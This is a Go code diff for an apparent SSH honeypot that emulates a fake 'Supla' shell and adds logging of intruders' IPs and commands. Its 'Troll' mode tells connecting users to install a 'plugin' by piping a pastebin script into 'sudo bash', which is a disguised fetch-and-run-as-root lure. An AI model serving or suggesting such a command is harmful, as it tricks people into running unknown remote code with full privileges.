@@ -2,9 +2,11 @@ package main
 
 import (
 	"fmt"
+	"io"
 	"log"
 	"math/rand"
 	"net"
+	"os"
 	"strings"
 	"time"
 
@@ -143,11 +145,11 @@ func (session TerminalSession) handleRequestType(request *ssh.Request) {
 }
 
 type ShellEmulator struct {
-	Channel      ssh.Channel
-	User         string
-	Mode         ServerMode
-	ClientIP     IPAddress
-	Logger       BanLogger
+	Channel       ssh.Channel
+	User          string
+	Mode          ServerMode
+	ClientIP      IPAddress
+	Logger        BanLogger
 	CommandBuffer []byte
 }
 
@@ -165,7 +167,7 @@ func (emulator *ShellEmulator) Loop() {
 			break
 		}
 	}
-	if emulator.Mode < 3{
+	if emulator.Mode < 3 {
 		emulator.banAndDisconnect()
 	}
 }
@@ -210,16 +212,31 @@ func (emulator *ShellEmulator) executeCommand() {
 	emulator.writePrompt()
 }
 
-func (emulator *ShellEmulator) generateResponse(commandLine string) string {
-	if emulator.Mode >= Troll {
-
-		return "SSH is incompatible.\r\nInstall the plugin using the command:\r\ncurl -sL https://pastebin.com/raw/eB7Ab1na | tr -d '\\r' | sudo bash\r\non your client and reconnect to use this shell.\r\n"
+func (emulator *ShellEmulator) CommandLogger(command string) {
+	fileLog, err := os.OpenFile("/var/log/MelisisCommandsLog.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
+	if err != nil {
+		log.Println("Error writing command in log")
 	}
-	switch commandLine{
-		case "help":
-			return "\r\nThe help command was blocked in this installation; please read the manual on the Supla kernel website.\r\n"
-		default:
-			return "\r\nbash: " + commandLine + ": command not found\r\n"
+	defer fileLog.Close()
+	termlog := io.MultiWriter(fileLog, os.Stdout)
+	log.SetOutput(termlog)
+	color.Set(color.FgYellow)
+	log.Printf("IP address: %s used the command: %s", emulator.ClientIP.ExtractIP(), command)
+	color.Unset()
+}
+
+func (emulator *ShellEmulator) generateResponse(commandLine string) string {
+	emulator.CommandLogger(commandLine)
+	if emulator.Mode >= Troll {
+		return "\r\nSSH is incompatible.\r\nInstall the plugin using the command:\r\n    curl -sL https://pastebin.com/raw/eB7Ab1na | tr -d '\\r' | sudo bash\r\non your client and reconnect to use this shell.\r\n"
+	}
+	switch commandLine {
+	case "help":
+		return `The help command was blocked in this installation; please read the manual on the Supla kernel website.`
+	default:
+		return fmt.Sprintf(`
+			bash: %s command not found.
+			`, commandLine)
 	}
 }
 
@@ -229,8 +246,9 @@ func (emulator *ShellEmulator) handleBackspace() {
 		emulator.Channel.Write([]byte("\b \b"))
 	}
 }
-func (emulator *ShellEmulator) wellcome(){
-	banner := fmt.Sprintf("\r\nKernel Supla 3.0\r\nSupla is an operating system created and developed by zk.\r\nTo learn about using the command: help\r\n")
+func (emulator *ShellEmulator) wellcome() {
+	banner := "\r\nkernel supla 3.0\r\nsupla is an operating system created and developed by zk.\r\nto learn about using the command: help\r\n"
+
 	emulator.Channel.Write([]byte(banner))
 }
 
